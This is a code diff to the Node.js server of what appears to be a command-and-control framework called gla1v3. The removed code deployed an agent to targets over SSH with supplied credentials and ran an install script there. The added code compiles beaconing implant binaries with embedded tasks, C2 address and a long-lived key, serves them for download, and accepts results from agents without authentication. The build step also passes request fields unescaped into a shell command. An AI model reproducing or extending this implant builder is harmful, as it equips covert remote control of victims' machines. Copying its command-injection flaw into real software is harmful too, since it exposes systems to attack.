@@ -859,7 +859,7 @@ app.delete('/api/edr-configs/:id', authenticateJWT, requireRole('admin'), (req, 
 });
 
 // ==================== AGENT DEPLOYMENT ====================
-const { Client } = require('ssh2');
+
 const { spawn } = require('child_process');
 const os = require('os');
 
@@ -874,7 +874,7 @@ function compileAgent(config) {
     // Generate unique filename for this build
     const timestamp = Date.now();
     const outputPath = path.join(__dirname, 'agents', `gla1v3-agent-linux-${timestamp}`);
-    const agentSourcePath = path.join(__dirname, '..', 'agents-go', 'cmd', 'agent');
+    const agentSourcePath = './cmd/agent';
     
     console.log(`[Compile] Building agent with config:`, config);
     console.log(`[Compile] Output: ${outputPath}`);
@@ -883,7 +883,7 @@ function compileAgent(config) {
     // Spawn go build process
     const buildEnv = { ...process.env, GOOS: 'linux', GOARCH: 'amd64' };
     const goProcess = spawn('go', ['build', '-ldflags', ldflags, '-o', outputPath, agentSourcePath], {
-      cwd: path.join(__dirname, '..', 'agents-go'),
+      cwd: '/agents-go',
       env: buildEnv
     });
     
@@ -916,177 +916,198 @@ function compileAgent(config) {
   });
 }
 
-// Deploy agent to Linux target via SSH
-app.post('/api/agents/deploy', authenticateJWT, requireRole(['admin']), auditAction('DEPLOY_AGENT'), async (req, res) => {
-  const { targetIP, sshUsername, sshPassword, agentName, agentConfig } = req.body;
+// Build custom agent with embedded certificates and tasks
+app.post('/api/agents/build-custom', authenticateJWT, requireRole(['admin']), auditAction('BUILD_CUSTOM_AGENT'), async (req, res) => {
+  const { agentId, tasks, beaconInterval, c2Server, targetOS, targetArch } = req.body;
+  const sessionId = req.user.sessionId;
   
-  if (!targetIP || !sshUsername || !sshPassword || !agentName) {
-    return res.status(400).json({ error: 'Missing required fields: targetIP, sshUsername, sshPassword, agentName' });
+  if (!agentId || !tasks || !Array.isArray(tasks)) {
+    return res.status(400).json({ error: 'Missing required fields: agentId, tasks (array)' });
   }
 
-  // Default agent configuration
   const config = {
-    beaconInterval: agentConfig?.beaconInterval || '30s',
-    c2Server: agentConfig?.c2Server || 'c2.gla1v3.local:4443'
+    beaconInterval: beaconInterval || '30s',
+    c2Server: c2Server || 'c2.gla1v3.local:4443',
+    targetOS: targetOS || 'linux',
+    targetArch: targetArch || 'amd64'
   };
 
   let agentBinaryPath = null;
 
   try {
-    // Step 1: Compile agent with custom configuration
-    console.log(`[Deploy] Compiling agent with configuration...`);
-    agentBinaryPath = await compileAgent(config);
+    console.log(`[Build] Creating custom agent: ${agentId} with ${tasks.length} tasks`);
     
-    // Step 2: Generate session certificate for the agent
-    console.log(`[Deploy] Generating session certificate for agent: ${agentName}`);
+    // Step 1: Generate session certificates for the agent
+    console.log(`[Build] Generating certificates for agent: ${agentId}`);
     const caResponse = await fetch('http://ca-service:3003/generate-cert', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ 
-        userId: agentName, 
-        commonName: agentName 
+        userId: agentId,
+        sessionId: sessionId,
+        role: 'agent',
+        ttl: 31536000  // 1 year for deployed agents
       })
     });
 
     if (!caResponse.ok) {
-      throw new Error(`CA service error: ${caResponse.statusText}`);
+      const errorText = await caResponse.text();
+      console.log(`[Build] CA service error response:`, errorText);
+      throw new Error(`CA service returned ${caResponse.status}: ${errorText}`);
     }
 
-    const certBundle = await caResponse.json();
+    const certs = await caResponse.json();
     
-    // Step 3: Read compiled agent binary
-    const agentBinary = fs.readFileSync(agentBinaryPath);
-    
-    // Step 3: Read installation script
-    const installScript = fs.readFileSync(path.join(__dirname, 'agents', 'install-agent.sh'), 'utf8');
-
-    // Step 4: SSH connection and deployment
-    console.log(`[Deploy] Connecting to ${targetIP} via SSH...`);
-    
-    const conn = new Client();
-    
-    const deploymentResult = await new Promise((resolve, reject) => {
-      let deployOutput = '';
-      
-      conn.on('ready', () => {
-        console.log(`[Deploy] SSH connection established`);
-        
-        // Transfer files via SFTP
-        conn.sftp((err, sftp) => {
-          if (err) return reject(err);
-          
-          console.log(`[Deploy] Transferring agent binary...`);
-          
-          // Transfer agent binary
-          const agentStream = sftp.createWriteStream('/tmp/gla1v3-agent');
-          agentStream.on('close', () => {
-            console.log(`[Deploy] Agent binary transferred`);
-            
-            // Transfer certificates
-            console.log(`[Deploy] Transferring certificates...`);
-            
-            const certStream = sftp.createWriteStream('/tmp/agent-cert.pem');
-            certStream.on('close', () => {
-              
-              const keyStream = sftp.createWriteStream('/tmp/agent-key.pem');
-              keyStream.on('close', () => {
-                
-                const caStream = sftp.createWriteStream('/tmp/ca.crt');
-                caStream.on('close', () => {
-                  
-                  // Transfer install script
-                  console.log(`[Deploy] Transferring installation script...`);
-                  const scriptStream = sftp.createWriteStream('/tmp/install-agent.sh');
-                  scriptStream.on('close', () => {
-                    
-                    sftp.end();
-                    
-                    // Execute installation script
-                    console.log(`[Deploy] Executing installation script...`);
-                    conn.exec(`chmod +x /tmp/install-agent.sh && /tmp/install-agent.sh "${agentName}" "${config.c2Server}"`, (err, stream) => {
-                      if (err) return reject(err);
-                      
-                      stream.on('close', (code, signal) => {
-                        conn.end();
-                        if (code === 0) {
-                          resolve({ success: true, output: deployOutput });
-                        } else {
-                          reject(new Error(`Installation script exited with code ${code}`));
-                        }
-                      }).on('data', (data) => {
-                        const output = data.toString();
-                        deployOutput += output;
-                        console.log(`[Deploy] ${output.trim()}`);
-                      }).stderr.on('data', (data) => {
-                        const output = data.toString();
-                        deployOutput += output;
-                        console.log(`[Deploy] STDERR: ${output.trim()}`);
-                      });
-                    });
-                    
-                  });
-                  scriptStream.write(installScript);
-                  scriptStream.end();
-                  
-                });
-                caStream.write(certBundle.ca);
-                caStream.end();
-                
-              });
-              keyStream.write(certBundle.key);
-              keyStream.end();
-              
-            });
-            certStream.write(certBundle.cert);
-            certStream.end();
-            
-          });
-          agentStream.write(agentBinary);
-          agentStream.end();
-          
-        });
-      }).on('error', (err) => {
-        reject(err);
-      }).connect({
-        host: targetIP,
-        port: 22,
-        username: sshUsername,
-        password: sshPassword,
-        readyTimeout: 30000
-      });
-    });
-
-    console.log(`[Deploy] Agent deployed successfully to ${targetIP}`);
-    
-    // Cleanup: Delete compiled binary after successful deployment
-    if (agentBinaryPath && fs.existsSync(agentBinaryPath)) {
-      fs.unlinkSync(agentBinaryPath);
-      console.log(`[Deploy] Cleaned up temporary binary: ${agentBinaryPath}`);
+    if (!certs.cert || !certs.key || !certs.caCert) {
+      throw new Error('CA service did not return valid certificates');
     }
+
+    // Step 2: Prepare embedded data (escape newlines for ldflags)
+    const tasksJSON = JSON.stringify(tasks).replace(/"/g, '\\"');
+    const embeddedCACert = certs.caCert.replace(/\n/g, '\\n');
+    const embeddedCert = certs.cert.replace(/\n/g, '\\n');
+    const embeddedKey = certs.key.replace(/\n/g, '\\n');
     
-    res.json({ 
-      success: true, 
-      message: 'Agent deployed successfully',
-      agentName,
-      targetIP,
-      config,
-      output: deploymentResult.output
+    // Step 3: Compile agent with embedded certs and tasks
+    const timestamp = Date.now();
+    const fileExt = config.targetOS === 'windows' ? '.exe' : '';
+    const outputFilename = `gla1v3-agent-${agentId}-${timestamp}${fileExt}`;
+    agentBinaryPath = path.join('/app/agents', outputFilename);
+    
+    // Ensure agents directory exists
+    if (!fs.existsSync('/app/agents')) {
+      fs.mkdirSync('/app/agents', { recursive: true });
+    }
+
+    const ldflags = [
+      `-X 'main.BeaconInterval=${config.beaconInterval}'`,
+      `-X 'main.C2Server=${config.c2Server}'`,
+      `-X 'main.EmbeddedTasks=${tasksJSON}'`,
+      `-X 'main.EmbeddedCACert=${embeddedCACert}'`,
+      `-X 'main.EmbeddedCert=${embeddedCert}'`,
+      `-X 'main.EmbeddedKey=${embeddedKey}'`
+    ].join(' ');
+
+    console.log(`[Build] Compiling agent for ${config.targetOS}/${config.targetArch}...`);
+    
+    const { exec } = require('child_process');
+    const { promisify } = require('util');
+    const execAsync = promisify(exec);
+
+    const { stdout, stderr } = await execAsync(
+      `CGO_ENABLED=0 GOOS=${config.targetOS} GOARCH=${config.targetArch} go build -ldflags "${ldflags}" -o ${agentBinaryPath} /agents-go/cmd/agent`,
+      { 
+        cwd: '/agents-go',
+        maxBuffer: 1024 * 1024 * 10 // 10MB buffer
+      }
+    );
+
+    if (stderr && stderr.includes('error')) {
+      throw new Error(`Go build failed: ${stderr}`);
+    }
+
+    if (!fs.existsSync(agentBinaryPath)) {
+      throw new Error('Agent binary was not created');
+    }
+
+    console.log(`[Build] Agent compiled successfully: ${agentBinaryPath}`);
+    
+    // Step 4: Return download info
+    res.json({
+      success: true,
+      agentId,
+      downloadPath: `/api/agents/download/${outputFilename}`,
+      filename: outputFilename,
+      tasks: tasks.length,
+      beaconInterval: config.beaconInterval,
+      c2Server: config.c2Server,
+      targetOS: config.targetOS,
+      targetArch: config.targetArch,
+      expiresAt: certs.expiresAt || new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString()
     });
 
   } catch (error) {
-    console.error(`[Deploy] Error:`, error.message);
+    console.error(`[Build] Error:`, error.message);
     
     // Cleanup: Delete compiled binary on error
     if (agentBinaryPath && fs.existsSync(agentBinaryPath)) {
       fs.unlinkSync(agentBinaryPath);
-      console.log(`[Deploy] Cleaned up temporary binary after error`);
+      console.log(`[Build] Cleaned up temporary binary after error`);
     }
     
     res.status(500).json({ 
-      error: 'Deployment failed', 
+      error: 'Agent build failed', 
       details: error.message 
     });
   }
+});
+
+// Download compiled agent binary
+app.get('/api/agents/download/:filename', authenticateJWT, (req, res) => {
+  const filename = req.params.filename;
+  const filepath = path.join('/app/agents', filename);
+  
+  // Security: prevent path traversal
+  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
+    return res.status(400).json({ error: 'Invalid filename' });
+  }
+  
+  if (!fs.existsSync(filepath)) {
+    return res.status(404).json({ error: 'Agent binary not found' });
+  }
+  
+  console.log(`[Download] Serving agent binary: ${filename}`);
+  
+  res.download(filepath, 'gla1v3-agent-linux', (err) => {
+    if (err) {
+      console.error(`[Download] Error:`, err.message);
+    } else {
+      // Delete file after successful download (after 60 seconds)
+      setTimeout(() => {
+        if (fs.existsSync(filepath)) {
+          fs.unlinkSync(filepath);
+          console.log(`[Download] Cleaned up binary: ${filename}`);
+        }
+      }, 60000);
+    }
+  });
+});
+
+// Receive embedded task results from agents
+app.post('/api/agents/:agentId/embedded-tasks', (req, res) => {
+  const { agentId } = req.params;
+  const { results } = req.body;
+  
+  if (!results || !Array.isArray(results)) {
+    return res.status(400).json({ error: 'Missing results array' });
+  }
+  
+  console.log(`[EmbeddedTasks] Received ${results.length} task results from agent: ${agentId}`);
+  
+  // Store results in the agent's task queue
+  if (!taskQueue.has(agentId)) {
+    taskQueue.set(agentId, []);
+  }
+  
+  const queue = taskQueue.get(agentId);
+  
+  for (const result of results) {
+    // Store as a completed task
+    queue.push({
+      id: result.taskID,
+      type: 'embedded',
+      taskType: result.type,
+      status: result.status,
+      result: result.output,
+      error: result.error || '',
+      createdAt: new Date().toISOString(),
+      completedAt: new Date().toISOString()
+    });
+    
+    console.log(`[EmbeddedTasks] Stored result for task ${result.taskID} (${result.type}): ${result.status}`);
+  }
+  
+  res.json({ success: true, stored: results.length });
 });
 
 // Secure whoami endpoint for agents to discover their public IP
